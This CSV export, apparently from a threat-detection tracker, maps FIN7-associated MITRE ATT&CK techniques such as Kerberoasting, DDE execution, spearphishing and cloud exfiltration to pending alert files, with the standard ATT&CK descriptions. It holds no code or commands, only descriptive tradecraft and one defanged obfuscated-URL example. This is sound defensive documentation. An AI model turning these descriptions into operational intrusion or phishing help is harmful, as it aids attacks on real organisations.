T1553.002,Code Signing,Defense-Evasion,Pending,alerts\FIN7\T1553.002_Code_Signing.html,,APT Matrix Generator,"Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) The certificates used during an operation may be created, acquired, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates) Unlike [Invalid Code Signature](https://attack.mitre.org/techniques/T1036/001), this activity will result in a valid signature.  Code signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing)(Citation: EclecticLightChecksonEXECodeSigning)  Code signing certificates may be used to bypass security policies that require signed code to execute on a system. ",https://attack.mitre.org/techniques/T1553/002/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1558.003,Kerberoasting,Credential-Access,Pending,alerts\FIN7\T1558.003_Kerberoasting.html,,APT Matrix Generator,"Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to [Brute Force](https://attack.mitre.org/techniques/T1110).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015)   Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service(Citation: Microsoft Detecting Kerberoasting Feb 2018)).(Citation: Microsoft SPN)(Citation: Microsoft SetSPN)(Citation: SANS Attacking Kerberos Nov 2014)(Citation: Harmj0y Kerberoast Nov 2016)  Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials.(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)  This same behavior could be executed using service tickets captured from network traffic.(Citation: AdSecurity Cracking Kerberos Dec 2015)  Cracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)",https://attack.mitre.org/techniques/T1558/003/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1559.002,Dynamic Data Exchange,Execution,Pending,alerts\FIN7\T1559.002_Dynamic_Data_Exchange.html,,APT Matrix Generator,"Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.  Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by [Component Object Model](https://attack.mitre.org/techniques/T1559/001), DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.(Citation: BleepingComputer DDE Disabled in Word Dec 2017)(Citation: Microsoft ADV170021 Dec 2017)(Citation: Microsoft DDE Advisory Nov 2017)  Microsoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros.(Citation: SensePost PS DDE May 2016)(Citation: Kettle CSV DDE Aug 2014)(Citation: Enigma Reviving DDE Jan 2018)(Citation: SensePost MacroLess DDE Oct 2017) Similarly, adversaries may infect payloads to execute applications and/or commands on a victim device by way of embedding DDE formulas within a CSV file intended to be opened through a Windows spreadsheet program.(Citation: OWASP CSV Injection)(Citation: CSV Excel Macro Injection )  DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). DDE execution can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)",https://attack.mitre.org/techniques/T1559/002/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1566.001,Spearphishing Attachment,Initial-Access,Pending,alerts\FIN7\T1566.001_Spearphishing_Attachment.html,,APT Matrix Generator,"Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.(Citation: Unit 42 DarkHydrus July 2018) Spearphishing may also involve social engineering techniques, such as posing as a trusted source.  There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. ",https://attack.mitre.org/techniques/T1566/001/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1566.002,Spearphishing Link,Initial-Access,Pending,alerts\FIN7\T1566.002_Spearphishing_Link.html,,APT Matrix Generator,"Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.  All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place.  Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an ""IDN homograph attack"").(Citation: CISA IDN ST05-016) URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an “@” symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)  Adversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation: Trend Micro Pawn Storm OAuth 2017) These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. (Citation: Microsoft OAuth 2.0 Consent Phishing 2021)  Adversaries may also utilize spearphishing links to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s that grant immediate access to the victim environment. For example, a user may be lured through “consent phishing” into granting adversaries permissions/access via a malicious OAuth 2.0 request URL .(Citation: Trend Micro Pawn Storm OAuth 2017)(Citation: Microsoft OAuth 2.0 Consent Phishing 2021)  Similarly, malicious links may also target device-based authorization, such as OAuth 2.0 device authorization grant flow which is typically used to authenticate devices without UIs/browsers. Known as “device code phishing,” an adversary may send a link that directs the victim to a malicious authorization page where the user is tricked into entering a code/credentials that produces a device token.(Citation: SecureWorks Device Code Phishing 2021)(Citation: Netskope Device Code Phishing 2021)(Citation: Optiv Device Code Phishing 2021)",https://attack.mitre.org/techniques/T1566/002/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1567.002,Exfiltration to Cloud Storage,Exfiltration,Pending,alerts\FIN7\T1567.002_Exfiltration_to_Cloud_Storage.html,,APT Matrix Generator,"Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.  Examples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service. ",https://attack.mitre.org/techniques/T1567/002/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1571,Non-Standard Port,Command-And-Control,Pending,alerts\FIN7\T1571_Non-Standard_Port.html,,APT Matrix Generator,"Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088(Citation: Symantec Elfin Mar 2019) or port 587(Citation: Fortinet Agent Tesla April 2018) as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.  Adversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.(Citation: change_rdp_port_conti)",https://attack.mitre.org/techniques/T1571/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1583.001,Domains,Resource-Development,Pending,alerts\FIN7\T1583.001_Domains.html,,APT Matrix Generator,"Adversaries may acquire domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.  Adversaries may use acquired domains for a variety of purposes, including for [Phishing](https://attack.mitre.org/techniques/T1566), [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), and Command and Control.(Citation: CISA MSS Sep 2020) Adversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain (TLD).(Citation: FireEye APT28)(Citation: PaypalScam) Typosquatting may be used to aid in delivery of payloads via [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). Adversaries may also use internationalized domain names (IDNs) and different character sets (e.g. Cyrillic, Greek, etc.) to execute ""IDN homograph attacks,"" creating visually similar lookalike domains used to deliver malware to victim machines.(Citation: CISA IDN ST05-016)(Citation: tt_httrack_fake_domains)(Citation: tt_obliqueRAT)(Citation: httrack_unhcr)(Citation: lazgroup_idn_phishing)  Different URIs/URLs may also be dynamically generated to uniquely serve malicious content to victims (including one-time, single use domain names).(Citation: iOS URL Scheme)(Citation: URI)(Citation: URI Use)(Citation: URI Unique)  Adversaries may also acquire and repurpose expired domains, which may be potentially already allowlisted/trusted by defenders based on an existing reputation/history.(Citation: Categorisation_not_boundary)(Citation: Domain_Steal_CC)(Citation: Redirectors_Domain_Fronting)(Citation: bypass_webproxy_filtering)  Domain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.(Citation: Mandiant APT1)  In addition to legitimately purchasing a domain, an adversary may register a new domain in a compromised environment. For example, in AWS environments, adversaries may leverage the Route53 domain service to register a domain and create hosted zones pointing to resources of the threat actor’s choosing.(Citation: Invictus IR DangerDev 2024)",https://attack.mitre.org/techniques/T1583/001/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1583.006,Web Services,Resource-Development,Pending,alerts\FIN7\T1583.006_Web_Services.html,,APT Matrix Generator,"Adversaries may register for web services that can be used during targeting. A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)), [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567), or [Phishing](https://attack.mitre.org/techniques/T1566). Using common services, such as those offered by Google, GitHub, or Twitter, makes it easier for adversaries to hide in expected noise.(Citation: FireEye APT29)(Citation: Hacker News GitHub Abuse 2024) By utilizing a web service, adversaries can make it difficult to physically tie back operations to them.",https://attack.mitre.org/techniques/T1583/006/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1587.001,Malware,Resource-Development,Pending,alerts\FIN7\T1587.001_Malware.html,,APT Matrix Generator,"Adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: ActiveMalwareEnergy)(Citation: FBI Flash FIN7 USB)  As with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware.  Some aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of [Web Services](https://attack.mitre.org/techniques/T1583/006).(Citation: FireEye APT29)",https://attack.mitre.org/techniques/T1587/001/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1588.002,Tool,Resource-Development,Pending,alerts\FIN7\T1588.002_Tool.html,,APT Matrix Generator,"Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as [Cobalt Strike](https://attack.mitre.org/software/S0154). Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.(Citation: Recorded Future Beacon 2019)  Adversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).",https://attack.mitre.org/techniques/T1588/002/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1608.001,Upload Malware,Resource-Development,Pending,alerts\FIN7\T1608.001_Upload_Malware.html,,APT Matrix Generator,"Adversaries may upload malware to third-party or adversary controlled infrastructure to make it accessible during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, and a variety of other malicious content. Adversaries may upload malware to support their operations, such as making a payload available to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) by placing it on an Internet accessible web server.  Malware may be placed on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)). Malware can also be staged on web services, such as GitHub or Pastebin, or hosted on the InterPlanetary File System (IPFS), where decentralized content storage makes the removal of malicious files difficult.(Citation: Volexity Ocean Lotus November 2020)(Citation: Talos IPFS 2022)  Adversaries may upload backdoored files, such as application binaries, virtual machine images, or container images, to third-party software stores or repositories (ex: GitHub, CNET, AWS Community AMIs, Docker Hub). By chance encounter, victims may directly download/install these backdoored files via [User Execution](https://attack.mitre.org/techniques/T1204). [Masquerading](https://attack.mitre.org/techniques/T1036) may increase the chance of users mistakenly executing these files.",https://attack.mitre.org/techniques/T1608/001/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1608.004,Drive-by Target,Resource-Development,Pending,alerts\FIN7\T1608.004_Drive-by_Target.html,,APT Matrix Generator,"Adversaries may prepare an operational environment to infect systems that visit a website over the normal course of browsing. Endpoint systems may be compromised through browsing to adversary controlled sites, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). In such cases, the user's web browser is typically targeted for exploitation (often not requiring any extra user interaction once landing on the site), but adversaries may also set up websites for non-exploitation behavior such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001). Prior to [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), adversaries must stage resources needed to deliver that exploit to users who browse to an adversary controlled site. Drive-by content can be staged on adversary controlled infrastructure that has been acquired ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or previously compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).  Adversaries may upload or inject malicious web content, such as [JavaScript](https://attack.mitre.org/techniques/T1059/007), into websites.(Citation: FireEye CFR Watering Hole 2012)(Citation: Gallagher 2015) This may be done in a number of ways, including:  * Inserting malicious scripts into web pages or other user controllable web content such as forum posts * Modifying script files served to websites from publicly writeable cloud storage buckets * Crafting malicious web advertisements and purchasing ad space on a website through legitimate ad providers (i.e., [Malvertising](https://attack.mitre.org/techniques/T1583/008))  In addition to staging content to exploit a user's web browser, adversaries may also stage scripting content to profile the user's browser (as in [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592)) to ensure it is vulnerable prior to attempting exploitation.(Citation: ATT ScanBox)  Websites compromised by an adversary and used to stage a drive-by may be ones visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is referred to a strategic web compromise or watering hole attack.  Adversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure ([Domains](https://attack.mitre.org/techniques/T1583/001)) to help facilitate [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).",https://attack.mitre.org/techniques/T1608/004/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1674,Input Injection,Execution,Pending,alerts\FIN7\T1674_Input_Injection.html,,APT Matrix Generator,"Adversaries may simulate keystrokes on a victim’s computer by various means to perform any type of action on behalf of the user, such as launching the command interpreter using keyboard shortcuts,  typing an inline script to be executed, or interacting directly with a GUI-based application.  These actions can be preprogrammed into adversary tooling or executed through physical devices such as Human Interface Devices (HIDs).  For example, adversaries have used tooling that monitors the Windows message loop to detect when a user visits bank-specific URLs. If detected, the tool then simulates keystrokes to open the developer console or select the address bar, pastes malicious JavaScript from the clipboard, and executes it - enabling manipulation of content within the browser, such as replacing bank account numbers during transactions.(Citation: BleepingComputer BackSwap)(Citation: welivesecurity BackSwap)  Adversaries have also used malicious USB devices to emulate keystrokes that launch PowerShell, leading to the download and execution of malware from adversary-controlled servers.(Citation: BleepingComputer USB)",https://attack.mitre.org/techniques/T1674/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
